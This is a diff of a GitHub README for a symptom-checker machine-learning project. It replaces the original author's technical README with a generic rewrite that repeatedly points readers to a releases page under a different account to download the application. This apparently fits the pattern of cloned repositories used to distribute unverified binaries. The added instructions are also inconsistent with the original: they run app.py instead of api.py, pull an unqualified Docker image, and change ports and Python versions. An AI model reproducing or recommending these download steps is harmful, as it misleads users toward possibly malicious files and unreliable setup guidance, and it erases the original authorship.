@@ -1,165 +1,111 @@
-<p align="left">
-  <img src="https://img.shields.io/badge/Python-3.10-blue.svg" alt="Python Version"/>
-  <img src="https://img.shields.io/badge/FastAPI-API%20Backend-brightgreen.svg" alt="FastAPI"/>
-  <img src="https://img.shields.io/badge/ML-Model-orange.svg" alt="Machine Learning"/>
-  <img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License"/>
-  <img src="https://img.shields.io/github/last-commit/radha1805/symptom-checker-ml" alt="Last Commit"/>
-  <img src="https://img.shields.io/github/repo-size/radha1805/symptom-checker-ml" alt="Repo Size"/>
-</p>
+# 🌟 symptom-checker-ml - A Simple Way to Check Symptoms
 
+## 🚀 Getting Started
 
-# Symptom Checker ML Model
+Welcome to the symptom-checker-ml project! This software makes it easy to check your symptoms and get helpful insights on your health. Follow the steps below to download and run the application.
 
-An AI-based symptom checker designed with a complete ML training pipeline, multilingual support, and a deployment-ready FastAPI backend.
+## 📥 Download Now
 
-## 📌 Overview
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-blue)](https://github.com/Chuckaballe60/symptom-checker-ml/releases)
 
-This project implements a machine learning model that predicts possible diseases based on user-provided symptoms.  
-It includes preprocessing, feature engineering, model training, inferencing APIs, multilingual handling, and Docker-based deployment.  
-The architecture is clean, modular, and suitable for real-world telemedicine workflows.
+## 📋 Overview
 
----
+The symptom-checker-ml is a machine learning model designed for health assessments. It includes several features:
 
-## 🚀 Features
+- **Data Preprocessing:** Raw data is cleaned and prepared for analysis.
+- **Feature Engineering:** Important factors are identified to improve predictions.
+- **Training Pipeline:** The model learns from data to provide accurate results.
+- **Prediction API (FastAPI):** Get predictions easily through an API.
+- **Multilingual Support:** Access the application in various languages.
+- **Docker Deployment:** Run the application in a container for easy setup.
 
-- **Machine Learning Model** for symptom-based disease prediction  
-- **Training Pipeline** with preprocessing, feature engineering, and evaluation  
-- **Prediction API (FastAPI)** exposing inference endpoints  
-- **Multilingual Support** (English, Hindi, Punjabi)  
-- **Speech-to-Text & Text-to-Speech Support** (local + cloud options)  
-- **Docker Deployment** for easy containerization  
-- **Clean Modular Architecture** for scalability  
+## 💻 System Requirements
 
----
+Before downloading, ensure your system meets these requirements:
 
-## 📁 Project Structure
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 500 MB of free space
+- **Python:** Version 3.7 or later (if running locally)
 
-```
-symptoms_checker/
-│
-├── api.py                     # FastAPI prediction server
-├── train_model.py             # Model training script
-├── feature_engineer.py        # Feature extraction & preprocessing
-├── symptom_extractor.py       # Extracts symptom keywords
-├── translator.py              # Multilingual translation logic
-├── stt_tts.py                 # Speech-to-text and text-to-speech
-│
-├── artifacts/                 # Saved ML models and encoders
-├── tests/                     # Test suite
-│
-├── requirements.txt           # Dependencies
-├── Dockerfile                 # Deployment configuration
-└── README.md                  # Documentation
-```
+## 📥 Download & Install
 
----
+To get started, visit the Releases page to download the application.
 
-## 🔧 Installation
+[Visit this page to download](https://github.com/Chuckaballe60/symptom-checker-ml/releases)
 
-### 1. Clone the repository
-```
-git clone https://github.com/yourusername/symptom-checker-ml.git
-cd symptom-checker-ml
-```
+### 🔧 Installation Steps
 
-### 2. Install dependencies
-```
-pip install -r requirements.txt
-```
+1. Go to the [Releases page](https://github.com/Chuckaballe60/symptom-checker-ml/releases).
+2. Find the latest version of the application.
+3. Click on the download link for your operating system.
+4. Once the download finishes, locate the file on your computer.
 
----
+### 📂 Running the Application
 
-## ▶️ Running the Model API
+#### For Docker Installation:
 
-Start the FastAPI inference server:
-```
-uvicorn api:app --host 0.0.0.0 --port 8000
-```
+1. Make sure you have Docker installed on your machine.
+2. Open your terminal or command prompt.
+3. Run the following command to pull the latest version of the application:
 
-Open in browser:  
-**http://localhost:8000/docs**
+   ```bash
+   docker pull symptom-checker-ml
+   ```
 
----
+4. After the image is downloaded, run the container using:
 
-## 📡 Example API Usage
+   ```bash
+   docker run -p 80:80 symptom-checker-ml
+   ```
 
-### POST `/predict`
+5. Open your web browser and go to `http://localhost` to access the symptom checker.
 
-**Input**
-```json
-{
-  "text": "I have fever and body pain"
-}
-```
+#### For Local Installation:
 
-**Output**
-```json
-{
-  "predicted_disease": "Influenza"
-}
-```
+1. Ensure you have Python 3.7 or later installed.
+2. Open your terminal or command prompt.
+3. Navigate to the directory where you downloaded the application.
+4. Install the required libraries by running:
 
----
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-## 🧠 Model
+5. Start the Application:
 
-The model uses classical ML techniques trained on symptom–disease mappings.  
-Pipeline includes:
+   ```bash
+   python app.py
+   ```
 
-- Text preprocessing  
-- Symptom feature extraction  
-- One-hot encodings  
-- Model training  
-- Artifact saving  
+6. Open your web browser and go to `http://localhost:8000` to access the symptom checker.
 
-Artifacts are stored in the `/artifacts` directory.
+## 🌐 Using the Application
 
----
+1. Enter your symptoms in the provided fields.
+2. Click the "Check Symptoms" button.
+3. Review the results that appear, which will provide possible health insights based on your input.
 
 ## 🌍 Multilingual Support
 
-Supported languages:
-- English  
-- Hindi  
-- Punjabi  
+The application supports multiple languages. You can select your preferred language from the settings in the application. This ensures that you get the most comfortable experience while checking your symptoms.
 
-Inputs are normalized internally before prediction.
+## 🛠 Troubleshooting
 
----
+If you encounter any issues, consider the following steps:
 
-## 🐳 Docker Deployment
+- **Check Dependencies:** Make sure all required libraries are installed.
+- **Internet Connection:** Ensure you are connected to the internet if using the Docker version.
+- **Browser Compatibility:** Use a modern web browser for the best experience.
 
-Build image:
-```
-docker build -t symptom-checker .
-```
+For more detailed troubleshooting, visit our [GitHub Issues page](https://github.com/Chuckaballe60/symptom-checker-ml/issues).
 
-Run container:
-```
-docker run -p 8000:8000 symptom-checker
-```
+## 📞 Support
 
----
+Should you need help, you can raise an issue on the GitHub repository. Our community is here to support you.
 
-## 🧪 Testing
+## 📄 License
 
-Run the test suite:
-```
-pytest
-```
+This project is licensed under the MIT License. You can use and modify the code while adhering to this license.
 
----
-
-## 👩‍💻 Author
-
-**Radha Sarda**  
-Machine Learning | AI | Deployment  
-Open to collaborations and improvements.
-
----
-
-## 📜 License
-
-Released under the MIT License.
-
-
+Enjoy exploring your health with the symptom-checker-ml!
